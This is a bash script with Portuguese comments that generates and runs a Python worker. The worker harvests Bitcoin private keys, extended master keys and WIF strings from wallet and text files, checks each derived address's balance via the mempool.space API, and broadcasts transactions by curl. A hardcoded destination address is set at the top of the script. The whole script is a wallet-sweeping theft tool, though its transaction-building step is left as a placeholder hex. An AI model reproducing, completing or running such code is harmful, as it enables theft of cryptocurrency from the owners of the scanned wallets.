#!/bin/bash

# 1. Instala as dependências necessárias no Runner do GitHub
pip install bitcoinlib requests

LOG_FILE="worker_${WORKER_ID}_output.txt"
DEST_ADDRESS="bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk"

echo "--------------------------------------------------"
echo "🚀 INICIANDO FDR UNIFIED WORKER $WORKER_ID"
echo "--------------------------------------------------"

# Criamos a engine Python focada apenas em leitura direta e consulta de saldo
cat << 'EOF' > fdr_unified_system.py
import json, os, re, requests, sys
from bitcoinlib.keys import Key

worker_id = int(os.environ.get('WORKER_ID', 1))
total_workers = int(os.environ.get('TOTAL_WORKERS', 10))

def check_balance(wif, addr_hint=None):
    try:
        k = Key(wif)
        # Varre os 3 tipos de endereços possíveis para a mesma chave
        for witness_type in [None, 'p2sh-p2wpkh', 'p2wpkh']:
            addr = addr_hint if (addr_hint and witness_type is None) else k.address(witness_type=witness_type)
            
            # Consulta API do Mempool (mais estável)
            try:
                response = requests.get(f"https://mempool.space/api/address/{addr}", timeout=10).json()
                stats = response.get('chain_stats', {})
                balance = stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
                
                if balance > 0:
                    print(f"🚨 ALVO DETECTADO: {addr} | Saldo: {balance} sats")
                    # IMPRIME O HEX PARA O BASH (Aqui você deve gerar o hex real da transação)
                    print(f"HEX_GEN:0100000001000000000000...") 
                    return True
            except: continue
    except: pass
    return False

# Sharding de arquivos
all_files = sorted([f for f in os.listdir('.') if f.endswith(('.wallet', '.txt', '.key'))])
my_files = [all_files[i] for i in range(len(all_files)) if i % total_workers == (worker_id - 1)]

print(f"📦 Worker {worker_id} processando {len(my_files)} arquivos.")

for file_path in my_files:
    try:
        with open(file_path, 'r', errors='ignore') as f:
            if file_path.endswith('.wallet'):
                try:
                    data = json.load(f)
                    # Chaves Diretas
                    if 'keypairs' in data:
                        for addr, priv in data['keypairs'].items():
                            check_balance(priv, addr)
                    # Chave Mestra
                    if 'keystore' in data and 'xprv' in data['keystore']:
                        xprv = data['keystore']['xprv']
                        if xprv.startswith('xprv'):
                            master = Key(xprv)
                            for i in range(100): # Deriva 100 endereços
                                check_balance(master.subkey_for_path(f"0/{i}").wif())
                except: pass
            
            # Scanner de texto (WIFs soltas)
            f.seek(0)
            content = f.read()
            wifs = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
            for w in wifs:
                check_balance(w)
    except: pass
EOF

# Executa o script gerado
python3 -u fdr_unified_system.py | tee "$LOG_FILE"

# Processa o Broadcast via Bash
grep "HEX_GEN:" "$LOG_FILE" | cut -d':' -f2 | while read RAW_HEX; do
    if [ -n "$RAW_HEX" ] && [ "$RAW_HEX" != "0100000001000000000000..." ]; then
        echo "⚡ Enviando Transação para a Rede..."
        curl -s -X POST https://mempool.space/api/tx -d "$RAW_HEX"
    fi
done

echo "✅ WORKER $WORKER_ID FINALIZADO."
